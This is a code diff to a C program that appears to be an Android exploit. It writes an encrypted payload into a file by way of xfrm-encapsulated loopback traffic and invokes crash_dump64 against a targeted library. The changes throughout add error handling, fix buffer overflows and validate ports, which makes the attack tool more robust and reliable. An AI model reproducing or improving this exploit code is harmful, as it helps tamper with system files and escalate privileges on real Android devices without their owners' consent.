@@ -17,8 +17,6 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 
-#define eos(s) (s + strlen(s))
-
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 
@@ -70,8 +68,11 @@ static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const cha
             execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
         _exit(1);
     }
-    int st = 0;
-    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    int st = -1;
+    if (TEMP_FAILURE_RETRY(waitpid(pid, &st, 0)) < 0) {
+        printf("waitpid failed: %s\n", strerror(errno));
+        return -1;
+    }
     return st;
 }
 
@@ -170,8 +171,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         .sin_port   = htons((uint16_t)g_sender_port),
         .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
     };
-    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
-        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
+    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0) {
+        /* the xfrm state matches on this source port; without it every
+         * encapsulated write is dropped and patching fails misleadingly */
+        printf("bind sender port %d failed: %s\n", g_sender_port, strerror(errno));
+        close(sk_send);
+        return -1;
+    }
     struct sockaddr_in dst = {
         .sin_family = AF_INET,
         .sin_port   = htons((uint16_t)g_encap_port),
@@ -308,16 +314,22 @@ static int read_device_versions(int *andr, int *major, int *minor) {
     if (!m) {
         printf("uname -r is missing Android version, trying getprop\n");
 
-        char vendor_ver[5];
-        char release[15];
+        char vendor_ver[8] = "";
+        char release[24];
 
         FILE *f = popen("getprop ro.vendor.build.version.release", "r");
-        fgets(vendor_ver, sizeof(vendor_ver), f);
+        if (!f) return -1;
+        char *line = fgets(vendor_ver, sizeof(vendor_ver), f);
         pclose(f);
+        if (!line) return -1;
 
-        sprintf(release, "android");
-        sprintf(eos(release), "%s", vendor_ver);
+        /* strip trailing newline/whitespace getprop may emit */
+        size_t len = strlen(vendor_ver);
+        while (len > 0 && (vendor_ver[len - 1] == '\n' || vendor_ver[len - 1] == '\r'))
+            vendor_ver[--len] = '\0';
+        if (len == 0) return -1;
 
+        snprintf(release, sizeof(release), "android%s", vendor_ver);
         m = release;
     }
     *andr = atoi(m + 7);
@@ -517,6 +529,10 @@ static int setup(int argc, char **argv) {
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
         usage(argv[0]); return 2;
+    }
+    if (encap_port < 1 || encap_port > 65535 || sender_port < 1 || sender_port > 65535) {
+        fprintf(stderr, "invalid port number\n");
+        return 2;
     }
 
     g_encap_port  = encap_port;
